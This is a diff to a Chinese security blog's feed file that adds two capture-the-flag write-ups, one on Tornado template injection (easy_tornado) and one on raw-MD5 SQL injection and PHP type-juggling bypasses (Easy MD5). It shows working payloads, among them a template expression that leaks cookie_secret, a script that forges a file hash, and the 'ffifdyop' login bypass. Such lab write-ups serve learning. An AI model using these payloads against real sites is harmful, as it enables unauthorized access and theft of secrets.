@@ -4,6 +4,43 @@
   
     
     <entry>
+      <title>（护网杯 2018）easy_tornado</title>
+      <link href="2021/02/24/20210224/"/>
+      <url>2021/02/24/20210224/</url>
+      
+        <content type="html"><![CDATA[<h2 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h2><p><img src="https://img-blog.csdnimg.cn/20210223223803358.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>分别查看</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/flag.txt</span><br><span class="line">/welcome.txt</span><br><span class="line">/hints.txt</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210223224141557.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210223224218589.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210223224232700.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">文件内容</span><br><span class="line">/flag.txt</span><br><span class="line">flag in /fllllllllllllag</span><br><span class="line"></span><br><span class="line">/welcome.txt</span><br><span class="line">render</span><br><span class="line"></span><br><span class="line">/hints.txt</span><br><span class="line">md5(cookie_secret+md5(filename))</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">tornado是一个python的模板，可能会产生SSTI注入漏洞</span><br><span class="line">flag在/fllllllllllllag中</span><br><span class="line">render是python中的一个渲染函数，也就是一种模板，通过调用的参数不同，生成不同的网页</span><br><span class="line">可以推断出filehash的值为md5(cookie_secret+md5(filename))</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/error?msg=Error</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210223225604492.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>通过<code>handler.settings</code>对象获取<code>cookie_secret</code>的值，即：<br><code>handler</code>指向<code>RequestHandler</code><br><code>RequestHandler.settings</code>指向<code>self.application.settings</code><br>所以<code>handler.settings</code>最终指向<code>RequestHandler.application.settings</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">error?msg=&#123;&#123;handler.settings&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210223225826301.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">根据获得的<code>cookie_secret</code>用python脚本构造<code>md5(cookie_secret+md5(filename))</code>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">filename = &#x27;/fllllllllllllag&#x27;</span><br><span class="line">cookie_secret = <span class="string">&quot;a4f8bcd5-d655-46cb-ab2b-b659cd96fc00&quot;</span></span><br><span class="line">tmp = hashlib.md5(filename.encode(encoding=&#x27;utf-8&#x27;)).hexdigest()</span><br><span class="line">data = cookie_secret + tmp</span><br><span class="line">res = hashlib.md5(data.encode(encoding=&#x27;utf-8&#x27;)).hexdigest()</span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210223231428232.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/file?filename=/fllllllllllllag&amp;filehash=<span class="number">18</span>d0bf4616d91a894f366b89612a56a9</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210223231501987.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">flag{afb0796e-57e3-4916-8c0f-308a7d507a4c}</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> web </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> PHP </tag>
+            
+            <tag> md5 </tag>
+            
+            <tag> tornado </tag>
+            
+            <tag> python </tag>
+            
+            <tag> SSTI </tag>
+            
+            <tag> render </tag>
+            
+            <tag> cookie_secret </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>sqli-labs(8-10)</title>
       <link href="2021/02/23/sqli-labs(8-10)/"/>
       <url>2021/02/23/sqli-labs(8-10)/</url>
@@ -23,6 +60,39 @@
             <tag> SQL </tag>
             
             <tag> SQL相关知识 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>（BJDCTF2020）Easy MD5</title>
+      <link href="2021/02/22/20210222/"/>
+      <url>2021/02/22/20210222/</url>
+      
+        <content type="html"><![CDATA[<h2 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="[BJDCTF2020]Easy MD5"></a>[BJDCTF2020]Easy MD5</h2><p>参考：<a href="https://blog.csdn.net/qq_35900276/article/details/78438077">MD5加密下的SQL注入</a><br><a href="https://blog.csdn.net/March97/article/details/81222922">sql注入：md5($password,true)</a><br><img src="https://img-blog.csdnimg.cn/20210223233631457.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>输入1，提交查询。<br><img src="https://img-blog.csdnimg.cn/20210223234047104.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">发现<code>leveldo4.php</code><br><img src="https://img-blog.csdnimg.cn/20210223234624885.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>bp抓包<br><img src="https://img-blog.csdnimg.cn/20210223234837326.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">请求头里面有<code>Hint: select * from &#39;admin&#39; where password=md5($pass,true)</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?password=ffifdyop</span><br></pre></td></tr></table></figure><p>比较特殊的字符串–ffifdyop<br><img src="https://img-blog.csdnimg.cn/20210224001043356.png" alt="在这里插入图片描述">所以 </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from ‘admin’ where password=md5(‘ffifdyop’,<span class="literal">true</span>)</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210224001110785.png" alt="在这里插入图片描述">所以直接输入 ffifdyop 就可以通过,万能密码。</p><p><img src="https://img-blog.csdnimg.cn/20210224000739849.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>指路到<code>/levels91.php</code><br><img src="https://img-blog.csdnimg.cn/20210224001257373.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">查看源码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">$a = $GET[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">$b = $_GET[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($a != $b &amp;&amp; md5($a) == md5($b))&#123;</span><br><span class="line">    <span class="comment">// wow, glzjin wants a girl friend.</span></span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure><p>数组弱类型比较，直接<code>a[]=1&amp;b[]2</code>进行绕过就可以。</p><p><img src="https://img-blog.csdnimg.cn/20210224001753530.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>指路<code>/levell14.php</code></p><p><img src="https://img-blog.csdnimg.cn/20210224001741611.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>post传参再次绕过<code>param1[]=1&amp;param2[]=2</code><br><img src="https://img-blog.csdnimg.cn/2021022400200238.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"> flag{e66bea5a-fdfb-4ad8-becb-3c152570022d}</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> web </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> PHP </tag>
+            
+            <tag> SQL </tag>
+            
+            <tag> 万能密码 </tag>
+            
+            <tag> 绕过姿势 </tag>
+            
+            <tag> md5 </tag>
             
         </tags>
       
